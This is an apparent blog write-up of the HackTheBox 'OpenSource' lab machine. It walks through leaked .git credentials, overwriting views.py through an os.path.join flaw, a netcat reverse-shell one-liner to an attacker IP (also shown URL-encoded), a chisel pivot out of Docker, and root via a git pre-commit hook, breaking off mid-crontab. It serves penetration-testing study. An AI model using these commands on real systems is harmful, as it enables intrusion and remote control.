<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - OpenSource" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials." /><meta property="og:description" content="Overview This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials." /><link rel="canonical" href="https://yufongg.github.io/posts/OpenSource/" /><meta property="og:url" content="https://yufongg.github.io/posts/OpenSource/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-22T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - OpenSource" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-06-22T00:00:00+08:00","description":"Overview This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials.","headline":"HackTheBox - OpenSource","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/OpenSource/"},"url":"https://yufongg.github.io/posts/OpenSource/"}</script><title>HackTheBox - OpenSource | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - OpenSource</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220810021625.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - OpenSource</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1655827200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-22 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1908 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials.</p><p>Also, after analzying the source code, there is a way to exploit the file upload application due to the lack of/insufficient user input sanitization. The exploit is done by adding a remote code execution functionality into views.py from the source code and replacing it w/ the webpageâ€™s via the file upload test instance, allowing us to obtain a shell.</p><p>For the privilege escalation part, we have to escalate our privileges twice, to Dev01 and to root. The initial shell we obtained is in a docker environment, and there exists a internal service on port 3000. Through chisel we are able to escape docker environment and access the internal service on port 3000 running gitea. We are able to login to gitea w/ the credentials from earlier (.git directory) and obtain dev01 SSH private key</p><p>On the system, pspy64 revealed that there is a cronjob running as root executing git. Git contains a GTFOBins entry allowing us to privilege escalate to root.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>OpenSource<tr><td>IP<td>10.10.11.164<tr><td>Points<td>-<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://app.hackthebox.com/users/476556">irogir</a><tr><td>Release Date<td>22-May-2022</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>200      GET       45l      144w     1563c http://10.10.11.164/console
200      GET     9803l    56722w  2489147c http://10.10.11.164/download
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">console</code><li><code class="language-plaintext highlighter-rouge">download</code></ul><h2 id="tcp3000-">TCP/3000 (?) <a href="#tcp3000-" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Filtered</ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---git-directory">TCP/80 (HTTP) - .git Directory <a href="#tcp80-http---git-directory" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">http://10.10.11.164</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622192252.png" alt="" data-proofer-ignore><ul><li>We are able download and view the source code by clicking the download button</ul><li>After clicking download, <code class="language-plaintext highlighter-rouge">source.zip</code> is downloaded <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622204731.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">.git</code> could reveal sensitive information</ul><li>View extract and view the contents of source.zip<ul><li>We have knowledge of the appâ€™s directory structure and code</ul><li><p>We are able to extract additional information from <code class="language-plaintext highlighter-rouge">.git</code> directory</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/open_source/10.10.11.164/loot/.git]
 â””â”€# git branch
   dev
 * public
 â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/open_source/10.10.11.164/loot/.git]
 â””â”€# git log dev
 commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
 Author: gituser &lt;gituser@local&gt;
 Date:   Thu Apr 28 13:47:24 2022 +0200

     ease testing

 commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
 Author: gituser &lt;gituser@local&gt;
 Date:   Thu Apr 28 13:46:54 2022 +0200

     added gitignore

 commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
 Author: gituser &lt;gituser@local&gt;
 Date:   Thu Apr 28 13:46:16 2022 +0200

     updated

 commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
 Author: gituser &lt;gituser@local&gt;
 Date:   Thu Apr 28 13:45:17 2022 +0200

</pre></table></code></div></div><li>After viewing the commits, commit <code class="language-plaintext highlighter-rouge">a76f8f75f7a4a12b706b0cf9c983796fa1985820</code> contains sensitive information<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/open_source/10.10.11.164/loot/.git]
 â””â”€# git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
 commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
 Author: gituser &lt;gituser@local&gt;
 Date:   Thu Apr 28 13:46:16 2022 +0200

     updated

 diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
 new file mode 100644
 index 0000000..5975e3f
 --- /dev/null
 +++ b/app/.vscode/settings.json
 @@ -0,0 +1,5 @@
 +{
 +  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
 +  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
 +  "http.proxyStrictSSL": false
 +}
 diff --git a/app/app/views.py b/app/app/views.py
 index f2744c6..0f3cc37 100644
 --- a/app/app/views.py
 +++ b/app/app/views.py
 @@ -6,7 +6,17 @@ from flask import render_template, request, send_file
  from app import app


 -@app.route('/', methods=['GET', 'POST'])
 +@app.route('/')
 +def index():
 +    return render_template('index.html')
 +
 +
 +@app.route('/download')
 +def download():
 +    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
 +
 +
 +@app.route('/upcloud', methods=['GET', 'POST'])
  def upload_file():
      if request.method == 'POST':
          f = request.files['file']
 @@ -20,4 +30,4 @@ def upload_file():
  @app.route('/uploads/&lt;path:path&gt;')
  def send_report(path):
      path = get_file_name(path)
 -    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
 \ No newline at end of file
 +    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

</pre></table></code></div></div><ul><li>dev01:Soulless_Developer#2022</ul><li>Proceed to <code class="language-plaintext highlighter-rouge">http://10.10.11.164/upcloud</code> &amp; attempt to upload <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622212605.png" alt="" data-proofer-ignore><li>However visiting <code class="language-plaintext highlighter-rouge">http://10.10.11.164/uploads/php-reverse-shell.php</code> does not execute the reverse shell, instead the file is downloaded</ol><h2 id="tcp80-http---exploiting-upcloud-by-analyzing-the-source-code">TCP/80 (HTTP) - Exploiting Upcloud by analyzing the source code <a href="#tcp80-http---exploiting-upcloud-by-analyzing-the-source-code" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After browsing through the source code, found a way to exploit the application<ul><li><code class="language-plaintext highlighter-rouge">views.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622205247.png" alt="" data-proofer-ignore> -<code class="language-plaintext highlighter-rouge">utils.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622205458.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">../</code> is replaced</ul></ul><li><code class="language-plaintext highlighter-rouge">os.path.join</code> is exploitable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>
 Source: https://www.geeksforgeeks.org/python-os-path-join-method/
 # Python program to explain os.path.join() method

 # importing os module
 import os

 # Path
 path = "/home"

 # Join various path components
 print(os.path.join(path, "User/Desktop", "file.txt"))


 # Path
 path = "User/Documents"

 # Join various path components
 print(os.path.join(path, "/home", "file.txt"))

 # In above example '/home'
 # represents an absolute path
 # so all previous components i.e User / Documents
 # are thrown away and joining continues
 # from the absolute path component i.e / home.


 # Path
 path = "/User"

 # Join various path components
 print(os.path.join(path, "Downloads", "file.txt", "/home"))

 # In above example '/User' and '/home'
 # both represents an absolute path
 # but '/home' is the last value
 # so all previous components before '/home'
 # will be discarded and joining will
 # continue from '/home'

 # Path
 path = "/home"

 # Join various path components
 print(os.path.join(path, "User/Public/", "Documents", ""))

 # In above example the last
 # path component is empty
 # so a directory separator ('/')
 # will be put at the end
 # along with the concatenated value

</pre></table></code></div></div><ul><li>We are able to upload a file wherever we want since we are able to <strong>throw away the previous path</strong> <code class="language-plaintext highlighter-rouge">public</code> &amp; <code class="language-plaintext highlighter-rouge">upload</code><li>For e.g. we wish to upload a file to /home directory, we have to name our file<ul><li><code class="language-plaintext highlighter-rouge">/home/test.txt</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/vmware_ZARksh0E1v.gif" alt="" data-proofer-ignore><li>This GIF recorded after I have obtained a shell (STEP 8) to prove that <code class="language-plaintext highlighter-rouge">os.path.join</code> can be exploited this way.<li>We have not obtained a shell at this point.</ul></ul><li>Earlier at we tried to include <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> but the file is not executed<li>Instead we have to replace <code class="language-plaintext highlighter-rouge">views.py</code> with our own version of it that will execute a reverse shell by exploiting <code class="language-plaintext highlighter-rouge">os.path.join</code><li>Add command execute functionality into <code class="language-plaintext highlighter-rouge">views.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622213126.png" alt="" data-proofer-ignore><li>Replace <code class="language-plaintext highlighter-rouge">views.py</code> and test whether our command execution functionality works <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220622214144.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/vmware_g2dbCRTyYF.gif" alt="" data-proofer-ignore><ul><li>Server is pinging our machine</ul><li>Reverse shell payload<ul><li>Reverse Shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.82 4444 &gt;/tmp/f
</pre></table></code></div></div><li>URL Encoded<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.82%204444%20%3E%2Ftmp%2Ff
</pre></table></code></div></div></ul><li>Obtain shell <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/vmware_EgRtOFfRY8.gif" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="dev01---docker-escape--pivot">Dev01 - Docker Escape + Pivot <a href="#dev01---docker-escape--pivot" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After looking through the forums for help, I found out that we have to pivot to another machine in order to access TCP/3000 where it was filtered during our NMAP scan<li>Proceed to <code class="language-plaintext highlighter-rouge">/</code>, we are in a docker environment<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre> / # ls -la
 total 72
 drwxr-xr-x    1 root     root          4096 Jun 22 14:23 .
 drwxr-xr-x    1 root     root          4096 Jun 22 14:23 ..
 -rwxr-xr-x    1 root     root             0 Jun 22 14:23 .dockerenv
 drwxr-xr-x    1 root     root          4096 Jun 22 16:03 app
 drwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin
 drwxr-xr-x    5 root     root           340 Jun 22 14:23 dev
 drwxr-xr-x    1 root     root          4096 Jun 22 14:23 etc
 drwxr-xr-x    2 root     root          4096 May  4 16:35 home
 drwxr-xr-x    1 root     root          4096 May  4 16:35 lib
 drwxr-xr-x    5 root     root          4096 May  4 16:35 media
 drwxr-xr-x    2 root     root          4096 May  4 16:35 mnt
 drwxr-xr-x    2 root     root          4096 May  4 16:35 opt
 dr-xr-xr-x  275 root     root             0 Jun 22 14:23 proc
 drwx------    1 root     root          4096 May  4 16:35 root
 drwxr-xr-x    1 root     root          4096 Jun 22 14:23 run
 drwxr-xr-x    1 root     root          4096 Mar 17 05:52 sbin
 drwxr-xr-x    2 root     root          4096 May  4 16:35 srv
 dr-xr-xr-x   13 root     root             0 Jun 22 14:23 sys
 drwxrwxrwt    1 root     root          4096 Jun 22 15:53 tmp
 drwxr-xr-x    1 root     root          4096 May  4 16:35 usr
 drwxr-xr-x    1 root     root          4096 May  4 16:35 var
</pre></table></code></div></div><li>Find out the IP address of the machine we just compromised<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> /app # 	ifconfig
 eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
           inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
           RX packets:15434 errors:0 dropped:0 overruns:0 frame:0
           TX packets:10755 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:17808811 (16.9 MiB)  TX bytes:9245580 (8.8 MiB)

 lo        Link encap:Local Loopback  
           inet addr:127.0.0.1  Mask:255.0.0.0
           UP LOOPBACK RUNNING  MTU:65536  Metric:1
           RX packets:2354 errors:0 dropped:0 overruns:0 frame:0
           TX packets:2354 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000 
           RX bytes:195576 (190.9 KiB)  TX bytes:195576 (190.9 KiB)

 /app # 
</pre></table></code></div></div><li>Some information about docker escape<ul><li>https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd<blockquote><p>The IP address of the docker container is 172.17.0.2 and the host machine mostly creates an interface that acts as a gateway for the Docker network. And, generally, the first IP address of the range is used for that i.e. 172.17.0.1 in this case.</p></blockquote></ul><li>We are trying to pivot into the actual machine, so instead of using IP <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, we use <code class="language-plaintext highlighter-rouge">172.17.0.1</code>, as the docker container <code class="language-plaintext highlighter-rouge">172.17.0.2</code> is unable to communicate with our Kali machine directly. (Im not very sure about this)<li>Use chisel to pivot<ol><li>Kali<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/tools/chisel]
 â””â”€# chisel server --reverse --port 1337
</pre></table></code></div></div><li>Target<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /app # ./chiselLinux64 client 10.10.14.16:1337 R:8888:172.17.0.1:3000 &amp;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623002006.png" alt="" data-proofer-ignore></p></ol><li>Access the newly opened port <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623002101.png" alt="" data-proofer-ignore><li>Found a familiar username <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623002136.png" alt="" data-proofer-ignore><li>Earlier, we found credentials for user <code class="language-plaintext highlighter-rouge">dev01</code><ul><li><code class="language-plaintext highlighter-rouge">dev01:Soulless_Developer#2022</code></ul><li>Successfully login <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623002309.png" alt="" data-proofer-ignore><li>Found SSH private key <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623003350.png" alt="" data-proofer-ignore><li>SSH w/ found private key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/open_source]
â””â”€# mv id_rsa.txt id_rsa

â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/open_source]
â””â”€# ssh -i id_rsa dev01@10.10.11.164
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623003447.png" alt="" data-proofer-ignore></p></ol><h2 id="root---via-cronjob">Root - Via Cronjob <a href="#root---via-cronjob" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Ran linpeas, did not find any vulnerabilities to exploit<li>Ran <code class="language-plaintext highlighter-rouge">pspy64</code> to sniff root processes, found an interesting process that is executed periodically <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623015528.png" alt="" data-proofer-ignore><li>Our current user <code class="language-plaintext highlighter-rouge">dev01</code> has the git directory in his home directory, we are able to edit files in it<li>Git has a <a href="https://gtfobins.github.io/gtfobins/git/">GTFO entry</a><ul><li>When git is run by a superuser, it does not drop elevated privileges</ul><li>Since git commit is running periodically, we are able to create <code class="language-plaintext highlighter-rouge">pre-commit</code> to spawn a root shell<ul><li><code class="language-plaintext highlighter-rouge">pre-commit</code> is executed everytime commit is run<li>https://www.atlassian.com/git/tutorials/git-hooks</ul><li>Create <code class="language-plaintext highlighter-rouge">pre-commit</code> and make it executable <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623011505.png" alt="" data-proofer-ignore><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> dev01@opensource:~/.git/hooks$ chmod +x pre-commit

</pre></table></code></div></div><li>Wait for cronjob to execute <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623015238.png" alt="" data-proofer-ignore><li><p>Root obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/OpenSource/images/Pasted%20image%2020220623011747.png" alt="" data-proofer-ignore></p><li><p>Cronjob that was running</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre> root@opensource:~# crontab -l
 # Edit this file to introduce tasks to be run by cron.
 # 
 # Each task to run has to be defined through a single line
 # indicating with different fields when the task will be run
 # and what command to run for the task
 # 
